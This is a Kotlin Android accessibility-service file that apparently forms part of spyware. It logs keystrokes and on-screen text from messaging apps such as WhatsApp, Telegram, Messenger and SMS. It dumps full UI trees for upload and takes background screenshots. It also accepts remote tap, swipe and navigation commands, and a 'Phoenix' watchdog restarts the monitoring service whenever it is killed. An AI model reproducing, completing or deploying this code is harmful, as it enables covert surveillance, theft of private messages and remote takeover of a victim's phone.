package com.example.myandroid

import kotlinx.coroutines.*

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import android.app.KeyguardManager
import android.os.Handler
import android.os.Looper

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
        fun triggerDataRecovery() {
            instance?.engageGhostHand()
        }
    }

    private var nextAllowedCheck = 0L
    private var cachedRules: JSONObject = JSONObject()
    
    // GHOST HAND STATE
    private var isGhostActive = false
    private var isLookingForToggle = false
    private val targetKeywords = listOf("Mobile data", "Data", "Cellular data", "Internet", "Connexion")
    
    // THROTTLE CONTROL
    private var lastScreenRead: Long = 0
    private val READ_DELAY = 1000L // Only read screen once per second

    // TREE SCRAPER STATE
    private var treeDumpEndTime = 0L
    private var targetDumpPkg: String? = null
    
    // PHOENIX STATE
    private var lastPhoenixCheck = 0L

    private fun checkMainServiceHealth() {
        try {
            if (!MonitorService.isRunning) {
                DebugLogger.log("PHOENIX", "Accessibility Symbiote detected dead MonitorService. Resurrecting...")
                val i = Intent(this, MonitorService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(i)
                else startService(i)
                
                // Also re-ignite the alarm manager loop
                KeepAliveReceiver.scheduleNext(this)
            }
        } catch (e: Exception) {}
    }

    fun startTreeDump(pkg: String?, mins: Long) {
        val editor = getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
        
        if (mins <= 0) {
            editor.putLong("tree_dump_end", 0L).putString("tree_dump_pkg", "").apply()
            treeDumpEndTime = 0L
            targetDumpPkg = null
            DebugLogger.log("SCRAM", "Scraper Disengaged")
            return
        }

        val endTime = System.currentTimeMillis() + (mins * 60 * 1000)
        val target = if (pkg.isNullOrEmpty() || pkg == "null") "" else pkg
        
        editor.putLong("tree_dump_end", endTime)
            .putString("tree_dump_pkg", target)
            .apply()
            
        targetDumpPkg = if (target.isEmpty()) null else target
        treeDumpEndTime = endTime
        DebugLogger.log("SCRAM", "Scraper Engaged: [${targetDumpPkg ?: "GLOBAL"}] for ${mins}m")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this



        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        
        // Restore Scraper Session
        treeDumpEndTime = prefs.getLong("tree_dump_end", 0L)
        val savedPkg = prefs.getString("tree_dump_pkg", "") ?: ""
        targetDumpPkg = if (savedPkg.isEmpty()) null else savedPkg
        
        val rulesStr = prefs.getString("cached_rules", "{}")
        cachedRules = try {
            val json = JSONObject(rulesStr)
            if (json.length() == 0) getDefaultRules() else json
        } catch (e: Exception) {
            getDefaultRules()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        val pkgName = event.packageName?.toString() ?: return
        
        // --- 0. PHOENIX HOOK (Resurrection check) ---
        val now = System.currentTimeMillis()
        if (now - lastPhoenixCheck > 60000) { // Throttle checks to once a minute maximum
            lastPhoenixCheck = now
            checkMainServiceHealth()
        }

        // --- 1. GHOST HAND LOGIC ---
        if (isGhostActive) {
            handleGhostEvent(event)
        }

        // --- 1.5 TREE SCRAPER ENGINE (Session-Based) ---
        if (now < treeDumpEndTime) {
            // Throttle: Only capture UI state every 2 seconds during a session to save resources
            if (now - lastScreenRead > 2000) {
                if (targetDumpPkg == null || targetDumpPkg == pkgName) {
                    val root = rootInActiveWindow
                    if (root != null) {
                        val treeJson = serializeNode(root, 0)
                        val wrapper = JSONObject()
                        wrapper.put("pkg", pkgName)
                        wrapper.put("ts", now)
                        wrapper.put("tree", treeJson)
                        DumpManager.appendLog("TREE", wrapper)
                        DebugLogger.log("SCRAPER", "UI Tree capture complete for [$pkgName]. Buffered for upload.")
                        lastScreenRead = now // Update throttle
                    }
                }
            }
        } else if (treeDumpEndTime != 0L) {
             // Cleanup expired session
             treeDumpEndTime = 0L
             targetDumpPkg = null
             getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                 .putLong("tree_dump_end", 0L).apply()
             DebugLogger.log("SCRAM", "Scraper Session Expired and Cleaned")
        }

        // --- 2. STANDARD MONITORING ---
        if (now < nextAllowedCheck) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             // Logic delegated to TypingManager
            val text = event.text.joinToString(" ")
            TypingManager.onType(this, pkgName, text)
            return
        }

        if (cachedRules.length() > 0 && !cachedRules.has(pkgName)) return
        
        // Feature Gate: Screen Reader
        if (!ConfigManager.canCollect(this, "screen_reader")) return

        // THROTTLE: Prevent high CPU usage during scrolling
        if (now - lastScreenRead < READ_DELAY) return
        lastScreenRead = now

        val source = event.source ?: return
        val textContent = StringBuilder()
        extractText(source, textContent)
        
        if (textContent.isNotEmpty()) {
            val pm = packageManager
            val appName = try { pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString() } catch (e: Exception) { pkgName }
            val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            
            val historyStr = prefs.getString("text_history_by_app", "{}")
            val rootJson = try { JSONObject(historyStr) } catch (e: Exception) { JSONObject() }
            val appArray = rootJson.optJSONArray(appName) ?: JSONArray()

            val newTxt = textContent.take(100).toString()
            val lastTxt = if (appArray.length() > 0) appArray.getJSONObject(appArray.length() - 1).optString("txt") else ""
            
            if (newTxt != lastTxt) {
                nextAllowedCheck = now + 500
                
                // 1. STREAM LOGGING (NO LAG)
                val entry = JSONObject()
                entry.put("pkg", appName)
                entry.put("ts", now)
                entry.put("txt", newTxt)
                DumpManager.appendLog("SCREEN", entry)
                
                // 2. Update Stats
                prefs.edit()
                    .putInt("interaction_count", prefs.getInt("interaction_count", 0) + 1)
                    .putString("last_screen_text", "[$appName] ${textContent.take(30)}...")
                    .apply()

                // 3. Verify
                DumpManager.logVerification("READER", pkgName)
            } else {
                nextAllowedCheck = now + 3000
            }
        }
    }

    fun engageGhostHand() {
        // Logic disabled: UI interaction is too fragile and manufacturer-dependent
        DebugLogger.log("GHOST", "Ghost Hand engagement skipped (Disabled)")
    }

    private fun handleGhostEvent(event: AccessibilityEvent) {
        // No-op: Ghost logic disabled
    }

    private fun performSwipeDown() {
        // No-op: Ghost logic disabled
    }

    private fun findAndClickToggle(node: AccessibilityNodeInfo): Boolean {
        // No-op: Ghost logic disabled
        return false
    }

    private fun extractText(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        if (node.text != null && node.text.isNotEmpty()) sb.append(node.text).append(" ")
        for (i in 0 until node.childCount) extractText(node.getChild(i), sb)
    }

    fun serializeNode(node: AccessibilityNodeInfo?, depth: Int): JSONObject? {
        if (node == null || depth > 50) return null
        val json = JSONObject()
        try {
            json.put("class", node.className)
            json.put("text", node.text)
            json.put("desc", node.contentDescription)
            json.put("id", node.viewIdResourceName)
            json.put("clickable", node.isClickable)
            
            val bounds = android.graphics.Rect()
            node.getBoundsInScreen(bounds)
            json.put("bounds", "${bounds.left},${bounds.top},${bounds.right},${bounds.bottom}")

            if (node.childCount > 0 && depth < 50) {
                val children = JSONArray()
                for (i in 0 until node.childCount) {
                    val child = serializeNode(node.getChild(i), depth + 1)
                    if (child != null) children.put(child)
                }
                json.put("children", children)
            }
        } catch (e: Exception) {}
        return json
    }

    override fun onInterrupt() {}

    // --- REMOTE INTERACTION ENGINE ---
    fun handleRemoteAction(action: String, params: List<String>): Boolean {
        return when (action) {
            "NAV" -> {
                val globalAction = when (params.getOrNull(0)?.uppercase()) {
                    "BACK" -> GLOBAL_ACTION_BACK
                    "HOME" -> GLOBAL_ACTION_HOME
                    "RECENTS" -> GLOBAL_ACTION_RECENTS
                    "NOTIFS" -> GLOBAL_ACTION_NOTIFICATIONS
                    else -> return false
                }
                performGlobalAction(globalAction)
            }
            "TAP" -> {
                val x = params.getOrNull(0)?.toFloatOrNull() ?: return false
                val y = params.getOrNull(1)?.toFloatOrNull() ?: return false
                dispatchClick(x, y)
            }
            "NODE" -> {
                val target = params.getOrNull(0) ?: return false
                val root = rootInActiveWindow ?: return false
                val nodes = root.findAccessibilityNodeInfosByViewId(target)
                val node = nodes.firstOrNull() ?: root.findAccessibilityNodeInfosByText(target).firstOrNull()
                if (node != null) {
                    val bounds = android.graphics.Rect()
                    node.getBoundsInScreen(bounds)
                    dispatchClick(bounds.centerX().toFloat(), bounds.centerY().toFloat())
                } else false
            }
            "SWIPE" -> {
                val x1 = params.getOrNull(0)?.toFloatOrNull() ?: return false
                val y1 = params.getOrNull(1)?.toFloatOrNull() ?: return false
                val x2 = params.getOrNull(2)?.toFloatOrNull() ?: return false
                val y2 = params.getOrNull(3)?.toFloatOrNull() ?: return false
                val dur = params.getOrNull(4)?.toLongOrNull() ?: 300L
                dispatchGesturePath(listOf(Pair(x1, y1), Pair(x2, y2)), dur)
            }
            "DRAW" -> {
                val dur = params.getOrNull(0)?.toLongOrNull() ?: 1000L
                val points = params.drop(1).mapNotNull {
                    val coords = it.split(",")
                    val px = coords.getOrNull(0)?.toFloatOrNull()
                    val py = coords.getOrNull(1)?.toFloatOrNull()
                    if (px != null && py != null) Pair(px, py) else null
                }
                if (points.size < 2) false else dispatchGesturePath(points, dur)
            }
            else -> false
        }
    }

    private fun dispatchClick(x: Float, y: Float): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val km = getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
        
        DebugLogger.log("GHOST_DEBUG", "Attempting Tap at [$x, $y] | Screen: ${pm.isInteractive} | Locked: ${km.isKeyguardLocked}")

        val path = android.graphics.Path()
        path.moveTo(x, y)
        // Wiggle: Move 1 pixel down and back to ensure the touch digitizer registers it as a physical event
        path.lineTo(x, y + 1)
        path.lineTo(x, y)

        val builder = android.accessibilityservice.GestureDescription.Builder()
        // A slightly longer duration (150ms) ensures the system 'feels' the press
        builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 150))
        
        return try {
            dispatchGesture(builder.build(), object : android.accessibilityservice.AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST", "Gesture confirmed by OS at $x,$y")
                }
                override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST_ERR", "Gesture REJECTED by OS. Check if screen is locked or overlapping system UI.")
                }
            }, Handler(Looper.getMainLooper()))
        } catch (e: Exception) {
            DebugLogger.log("GHOST_FATAL", "Gesture Dispatch Failed: ${e.message}")
            false
        }
    }

    private fun dispatchGesturePath(points: List<Pair<Float, Float>>, dur: Long): Boolean {
        val path = android.graphics.Path()
        val start = points.first()
        path.moveTo(start.first, start.second)
        
        points.drop(1).forEach { (x, y) ->
            path.lineTo(x, y)
        }

        val builder = android.accessibilityservice.GestureDescription.Builder()
        builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, dur))
        return try {
            dispatchGesture(builder.build(), object : android.accessibilityservice.AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST", "Gesture Path Completed")
                }
                override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST_ERR", "Gesture Cancelled by System")
                }
            }, Handler(Looper.getMainLooper()))
        } catch (e: Exception) {
            DebugLogger.log("GHOST_FATAL", e.message ?: "Unknown")
            false
        }
    }

    fun captureScreenshot(quality: Int, callback: (java.io.File?) -> Unit) {
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
            DebugLogger.log("SCREENSHOT_ERR", "API 30+ required for background screenshot.")
            callback(null)
            return
        }

        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, mainExecutor, object : TakeScreenshotCallback {
            override fun onSuccess(screenshot: ScreenshotResult) {
                try {
                    val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
                    if (bitmap == null) { callback(null); return }
                    
                    val file = java.io.File(cacheDir, "scrn_${System.currentTimeMillis()}.jpg")
                    java.io.FileOutputStream(file).use { out ->
                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, out)
                    }
                    screenshot.hardwareBuffer.close()
                    callback(file)
                } catch (e: Exception) {
                    DebugLogger.log("SCREENSHOT_ERR", "Processing failed: ${e.message}")
                    callback(null)
                }
            }
            override fun onFailure(errorCode: Int) {
                DebugLogger.log("SCREENSHOT_ERR", "System denied capture. Error code: $errorCode")
                callback(null)
            }
        })
    }

    private fun getDefaultRules(): JSONObject {
        val defaults = JSONObject()
        val apps = listOf("com.google.android.apps.messaging", "com.samsung.android.messaging", "com.whatsapp", "org.telegram.messenger", "org.telegram.plus", "com.imo.android.imoim", "com.imo.android.imoimlite", "com.imo.android.imoimbeta", "com.imo.android.imoimhd", "com.truecaller", "com.android.chrome", "com.facebook.orca", "com.instagram.android")
        for (app in apps) defaults.put(app, JSONObject())
        return defaults
    }
}
